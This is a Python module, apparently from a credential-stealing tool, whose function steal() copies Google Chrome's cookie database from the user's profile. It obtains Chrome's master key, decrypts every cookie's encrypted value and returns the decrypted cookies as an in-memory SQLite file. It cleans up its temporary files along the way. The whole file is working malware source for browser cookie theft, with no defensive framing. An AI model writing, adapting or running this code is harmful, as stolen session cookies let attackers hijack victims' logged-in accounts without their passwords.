import os
from . import encryption
import sqlite3
import shutil
import tempfile
import io

CREATE_COOKIES = """CREATE TABLE cookies(creation_utc INTEGER NOT NULL,host_key TEXT NOT NULL,name TEXT NOT NULL,value TEXT NOT NULL,path TEXT NOT NULL,expires_utc INTEGER NOT NULL,is_secure INTEGER NOT NULL,is_httponly INTEGER NOT NULL,last_access_utc INTEGER NOT NULL,has_expires INTEGER NOT NULL DEFAULT 1,is_persistent INTEGER NOT NULL DEFAULT 1,priority INTEGER NOT NULL DEFAULT 1,encrypted_value TEXT DEFAULT '',samesite INTEGER NOT NULL DEFAULT -1, source_scheme INTEGER NOT NULL DEFAULT 0,UNIQUE (host_key, name, path))"""
CREATE_META = """CREATE TABLE meta(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value LONGVARCHAR)"""
SELECT_COOKIES = """SELECT * FROM cookies"""
INSERT_COOKIE = """INSERT INTO cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""
SELECT_META = """SELECT * FROM meta"""
INSERT_META = """INSERT INTO meta VALUES (?,?)"""

def steal():
    chrome_userdata = os.path.join(os.getenv("appdata"), r"..", r'Local\Google\Chrome\User Data')
    tmp_database = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    tmp_save_database = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    chrome_database = os.path.join(chrome_userdata, r'Default\Cookies')
    
    shutil.copy2(chrome_database, tmp_database)

    master_key = encryption.get_master_key(chrome_userdata)

    conn = sqlite3.connect(tmp_database)
    conn_save = sqlite3.connect(tmp_save_database)

    cursor = conn.cursor()
    cursor_save = conn_save.cursor()

    cursor_save.execute(CREATE_COOKIES)
    cursor_save.execute(CREATE_META)

    cursor.execute(SELECT_COOKIES)

    for result in cursor.fetchall():
        result = list(result)
        try:
            result[12] = encryption.decrypt_password(result[12], master_key)
        except Exception as e:
            pass
        cursor_save.execute(INSERT_COOKIE, result)

    cursor.execute(SELECT_META)

    for result in cursor.fetchall():
        cursor_save.execute(INSERT_META, result)


    conn_save.commit()    
    
    cursor.close()
    cursor_save.close()

    conn.close()
    conn_save.close()

    os.remove(tmp_database)
    with open(tmp_save_database, "rb") as f:
        data = io.BytesIO(f.read())
    os.remove(tmp_save_database)

    return data
